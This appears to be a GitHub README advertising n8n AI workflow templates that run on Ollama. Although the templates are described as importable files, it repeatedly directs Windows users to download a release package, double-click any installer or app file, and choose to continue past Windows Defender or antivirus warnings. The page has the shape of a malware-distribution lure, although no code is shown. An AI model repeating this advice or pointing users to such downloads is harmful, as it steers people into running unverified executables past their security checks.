# 🤖 n8n-ai-workflows - Ready-to-Use AI Workflows

[![Download n8n-ai-workflows](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Vanillapfalz374/n8n-ai-workflows/releases)

## 🚀 What This Is

n8n-ai-workflows is a set of 15 ready-made n8n workflow templates for everyday automation tasks. It uses Ollama, so the AI runs on your own machine. You do not need API keys.

Use it to handle tasks like:

- Email replies and sorting
- Lead scoring
- Content creation
- Chatbots
- RAG knowledge lookup
- Data cleanup
- Text summaries
- Internal task automation

Each workflow is built for a common use case and is meant to be imported into n8n with a simple setup.

## 📥 Download

Visit this page to download the release files:

[Download from GitHub Releases](https://github.com/Vanillapfalz374/n8n-ai-workflows/releases)

On that page, look for the latest release and download the file for Windows. If the release includes a zip file, download it and extract it first.

## 🪟 Windows Setup

Follow these steps on Windows:

1. Open the download page and get the latest release file.
2. If the file is a `.zip`, right-click it and select **Extract All**.
3. Open the extracted folder.
4. Look for the workflow files, readme files, or setup instructions.
5. If the package includes n8n import files, open n8n and import them.
6. If the package includes an installer or app file, double-click it to start.

If you use Windows Defender or another antivirus tool, it may ask for permission when you open the file. Choose the option that lets you continue if you trust the source.

## 🧰 What You Need

Before you start, make sure you have:

- A Windows computer
- Internet access
- Enough free disk space for the download
- n8n installed, or access to an n8n instance
- Ollama installed if the workflows use local AI directly
- A local AI model in Ollama, such as a general chat model

If you do not have Ollama yet, install it first and start it before importing workflows that use AI.

## 🧭 How to Use It

Once you have the files:

1. Open n8n in your browser.
2. Import the workflow file from the release package.
3. Open the workflow and review the settings.
4. Set up any email, file, or webhook connections the workflow needs.
5. Choose the Ollama model you want to use.
6. Save the workflow.
7. Run a test to confirm it works.

Some workflows may need you to enter folder paths, email settings, or chatbot prompts. Use the field labels in the workflow as your guide.

## 🧠 Included Workflow Types

This repository includes templates for tasks such as:

- Email automation
- Lead scoring
- Content generation
- AI chatbots
- Retrieval-augmented generation
- Document lookup
- Message drafting
- Data processing
- Task routing
- Internal assistant flows

These templates are built for common business and personal use cases. They can save time on repeat work and help you keep tasks organized.

## 🛠️ Common Setup Steps

Most workflows follow a similar setup pattern:

1. Import the workflow into n8n.
2. Open each node and check the values.
3. Add your email account, if needed.
4. Select your Ollama model.
5. Add any folder or file paths.
6. Test the trigger node.
7. Check the output and adjust the prompt if needed.

If a workflow uses file input, place your files in the folder named in the workflow. If it uses email, connect the correct inbox or SMTP settings inside n8n.

## 🔍 Example Use Cases

Here are a few ways people can use the templates:

- Sort incoming emails and draft replies
- Score leads based on message text
- Turn notes into blog drafts
- Answer questions from local documents
- Run a chatbot on your own machine
- Extract key details from long text
- Route requests to the right next step

These workflows are useful when you want AI help without sending data to outside services.

## 💻 Suggested System Setup

A basic Windows setup works well for most users:

- Windows 10 or Windows 11
- 8 GB RAM or more
- 10 GB free disk space
- A recent CPU
- Ollama installed locally
- n8n running on your machine or on a server you can open in a browser

For smoother local AI use, more RAM helps. If your machine is older, use a smaller Ollama model.

## 📂 File Types You May See

The release may include files such as:

- `.json` workflow exports
- `.zip` archives
- `.md` instructions
- `.txt` notes
- config files for setup

If you see a `.json` file, that is often the file you import into n8n. If you see a `.zip`, extract it first so you can find the workflow files inside.

## 🔄 Updating to a New Version

When a new release appears:

1. Go back to the release page.
2. Download the newest file.
3. Save your old workflow copy first.
4. Import the new version into n8n.
5. Compare the new nodes with your old setup.
6. Test the workflow again.

This helps you keep your setup current without losing your changes.

## ❓ If Something Does Not Work

If a workflow does not run, check these items:

- n8n is open and running
- Ollama is running
- The model name matches the one in the workflow
- The import file loaded without errors
- Any email or webhook settings are filled in
- The trigger node is turned on
- The file path exists on your computer

If the workflow still fails, open each node one by one and check the field values. Small setup issues are the most common cause.

## 📌 Repository Topics

- ai-automation
- ai-workflows
- automation
- chatbot
- content-generation
- email-automation
- lead-scoring
- llm
- local-ai
- n8n
- no-code
- ollama
- rag
- self-hosted
- workflow-templates

## 🧩 Best Fit For

This project fits users who want to:

- Save time on repeat tasks
- Use local AI on Windows
- Work with n8n without building from scratch
- Avoid API keys
- Keep data on their own system
- Start from ready-made templates instead of blank workflows

## 📎 Download Again

[Open the release page and download the latest file](https://github.com/Vanillapfalz374/n8n-ai-workflows/releases)